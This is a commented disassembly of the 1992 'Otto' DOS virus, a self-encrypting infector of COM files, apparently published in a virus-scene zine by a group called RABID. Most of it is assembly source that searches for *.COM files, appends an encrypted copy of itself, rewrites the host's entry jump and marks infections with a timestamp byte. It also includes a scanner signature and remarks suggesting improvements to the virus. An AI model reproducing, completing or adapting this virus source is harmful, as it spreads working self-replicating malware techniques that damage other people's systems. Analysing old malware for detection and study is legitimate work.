;******************************************************************************
;				Otto Virus
;
;		       Disassembled by Data Disruptor
;  		 (c) 1992 RABID International Development
; 				(May.12.92)
;
;         Original virus written by YAM (Youth Against McAfee) 1992
;
; Notes: Otto Schtuck (Pardon the spelling?) claims that this is a super-
;	 encrypting virus. Well, it took me all of two minutes to get the virus
;	 into it's disassembled form. Try again guys. It wasn't half bad. For
;	 this virus, I could not use the techniques outlined in my article in
;	 Censor Volume 1~, therefore, I had to use another method (which, 
;	 coincidentally is a lot better). Be expecting "Decrypting Viruses
;	 Part ][" in the next issue of Censor (Slated for release in early
;	 June).
;
;	 As always, these disassemblies compile but do not run. They are
; 	 intended to be used for "Hmm. Let's see how that group program's"
;	 purposes only.
;
;							Data Disruptor
;							    RABID
;
; ~ I don't know the reason why my method outlined in Censor I didn't work.
;   It could have had something to do with SMARTDRV and FSP conflicting in
;   memory. Nonetheless, another method was found.
;
; (Ok. So it's not one of my best disassemblies, but at least it shows how
;  one can decrypt encrypted viruses...)
;
; A scan for this virus is;
;
;	# Otto - Written by Otto Schtuck
;	"8A 24 32 E0 88 24 46" Otto Schtuck [Otto] *NEW*
;
; It does no damage, does not hide it's file increase, but preserves the time
; & date stamp. It does not display any message. It is a transient COM infector
; that will infect one file in the current directory each time it is run.
; 
;******************************************************************************

file_handle	equ	9Eh			; File handle location
enc_bit		equ	0FFh			; Encryption bit

code		segment	byte public
		assume	cs:code, ds:code
		org	100h

;---
; Length of virus is 379 bytes...
;---

otto_vir	proc	far
start:
		jmp	short virus_entry	; Virus entry here
;---
; This hunk of shit here looks encrypted. I couldn't be bothered to go any
; further...
;---

crypt_1		db	90h
		db	 12h, 44h, 75h, 64h, 6Eh,0C1h
		db	 0Eh,0EDh, 70h, 05h, 34h, 5Dh
		db	 77h,0EBh, 35h,0D4h, 35h, 46h
		db	 34h, 68h, 7Ch,0A2h, 05h,0C1h
		db	 24h, 49h, 34h, 4Eh, 6Ch,0F1h
		db	 33h,0D5h, 20h, 5Ch, 7Bh, 78h
		db	 08h, 88h
crypt_2		db	69h
		db	0C3h, 79h
		db	 08h, 25h, 33h, 3Ch
		db	0B0h, 61h,0F2h, 11h, 6Ah, 5Dh
		db	 4Eh, 25h,0CBh, 2Fh,0D4h, 35h
		db	 5Ah, 7Ah, 6Bh, 71h,0EBh, 2Eh
		db	0CEh, 31h, 44h, 19h, 00h, 1Fh
virus_entry:
		cmp	al,[bx+di-14h]		
		popf				; Pop flags
		or	ax,bp
		add	[bx+si],al
		pop	si
		push	si
		sub	si,108h
		pop	ax
		sub	ax,100h
		mov	ds:enc_bit,al
		push	si
		mov	cx,17Bh			; 379 bytes
		add	si,offset crypt_2

decrypt:
		mov	ah,[si]
		xor	ah,al
		mov	[si],ah
		inc	si
		ror	al,1			; Rotate
		loop	decrypt 

		pop	si
		mov	ax,enc_ax[si]
		mov	dh,enc_dh[si]
		mov	word ptr ds:[100h],ax
		mov	crypt_1,dh
		lea	dx,filespec		; Set filespec
		xor	cx,cx			; Search for normal files
		mov	ah,4Eh			; Search for first match
search_handler:
		int	21h			
		jnc	got_file
		jmp	quit
;---
; Otto! If you want to save some bytes, you don't have to open the file in 
; order to get it's time. There are other ways around this...
;---

got_file:
		mov	dx,file_handle		; Get file handle from DTA
		mov	ax,3D02h		; Open file with read/write
		int	21h			
		mov	bx,ax			; Save file handle in BX
		mov	ax,5700h
		int	21h			; Get time/date from file
		cmp	cl,3			; Check timestamp
		jne	found_host		; Not equal to our timestamp?
		mov	ah,3Eh			; Then close the file and...
		int	21h			; 
		mov	ah,4Fh			; ...Search for next match
		jmp	short search_handler
found_host:
		push	cx
		push	dx
		call	move_ptr_start		; Move file pointer to start
		lea	dx,[si+three_bytes]	; Set buffer space for 3 bytes
		mov	cx,3			; Set for 3 bytes
		mov	ah,3Fh			; Read in file
		int	21h		
		xor	cx,cx			; Set registers to...
		xor	dx,dx			; ...absolute end of file
		mov	ax,4202h
		int	21h			; Move file point to end
		mov	word ptr ptr_loc[si],ax
		sub	ax,3
		mov	adj_ptr_loc[si],ax
		call	move_ptr_start
		add	ax,6
		mov	work[si],al
		mov	cx,word ptr ptr_loc[si]
;---
; Set buffer space at end of the file so that we don't waste space in the
; virus
;---
		lea	dx,[si+2A4h]	
		mov	ah,3Fh			; Read in file
		int	21h		
		push	si
		mov	al,work[si]
		add	si,offset copyright+4
		call	encrypt
		pop	si
		call	move_ptr_start
		mov	cx,word ptr ptr_loc[si]
		lea	dx,[si+2A4h]		; Load effective addr
		mov	ah,40h			; 
		int	21h			
		jnc	check_write		; 
		jmp	short quit
check_write:
		lea	dx,[si+105h]		; Load effective addr
		mov	cx,24h
		mov	ah,40h			; 
		int	21h		
		push	si
		mov	cx,17Bh			; 379 bytes
		mov	di,si
		add	di,offset copyright+1
		add	si,offset crypt_2
		rep	movsb			; 
		pop	si
		push	si
		mov	al,work[si]
		mov	cx,17Bh			; 397 bytes
		add	si,offset copyright+1
		call	encrypt
		pop	si
		mov	cx,17Bh			; 397 bytes
		lea	dx,[si+2A4h]		; Set buffer to encrypted data
		mov	ah,40h			; Write out the virus to the 
						; file
		int	21h			
		jc	quit			; Jump if carry Set
		call	move_ptr_start		; Move file pointer to start
		lea	dx,[si+new_jump]	; Load DX with the new jump
		mov	ah,40h			; 
		mov	cx,3			; Set for 3 bytes
		int	21h			; Write out the new jump
		jc	quit			; Jump if carry Set
		pop	dx
		pop	cx
		mov	cl,3			; Set low order time with 
						; our identity byte
		mov	ax,5701h
		int	21h			; Set file date/time
		mov	ah,3Eh			; 
		int	21h			; Close the file

;---
; Hmm. This routine looks a bit familiar... Maybe it was "borrowed" from the
; RAGE Virus we wrote...
;---

quit:
		push	si			; Save our SI
		mov	al,ds:enc_bit		; Load AL with value of the
						; encryption bit
		xor	cx,cx			; 
		add	cx,si			; Load CX with original 3 bytes
		add	cx,3			; Adjust value for offset of
						; virgin code
		mov	bp,103h			; Load BP with offset of 103h
						; Where the virgin code starts
		mov	si,bp			; Copy this location to SI
		call	encrypt			; Encrypt this portion of the
						; code
		pop	si			; Restore original SI
		mov	bp,offset start		; Load BP with offset of start
						; of the virgin code
		jmp	bp			; Jump to start of virgin code
otto_vir	endp

encrypt		proc	near
encryption:
		mov	ah,[si]
		xor	ah,al
		mov	[si],ah
		inc	si
		ror	al,1			; Rotate
		loop	encryption

		retn
encrypt		endp

		db	'OTTO VIRUS written by:OTTO '
enc_ax		dw	4353h			; Encryption shit loaded in AX
enc_dh		db	48h			; Encryption shit loaded in DH
		db	54h
adj_ptr_loc	dw	4355h			; Adjusted file pointer
						; location (ptr_loc-3 bytes)
work		db	4Bh			; A work buffer
ptr_loc		db	20h			; File pointer location
copyright	db	'COPYRIGHT MICROSHAFT INDUSTRIES '
		db	'1992 (tm.)PQR'
;---
; Everything below here appeared as a bunch of hex shit I had to convert...
;---

move_ptr_start	proc	near
		mov	ax,4200h		; Move fp to start (B80042)
		xor	cx,cx			; (33C9)
		xor	dx,dx			; (33D2)
		int	21h			; Call DOS (CD21)
		pop	dx			; (5A)
		pop	cx			; (59)
		pop	ax			; (58)
		ret				; (C3)
move_ptr_start	endp

filespec	db	'*.COM',0		; Location 295h

three_bytes	db	0ebh,46h,90h		; jmp 148 (Location 29Bh)
new_jump	db	0e9h,4ah,00h		; jmp 150 (Loc 29Eh)
		push	ax			; Loc 2A1h
		dec	bp			; Loc 2A2h
		db	00h			; Loc 2A3h

code		ends



		end	start


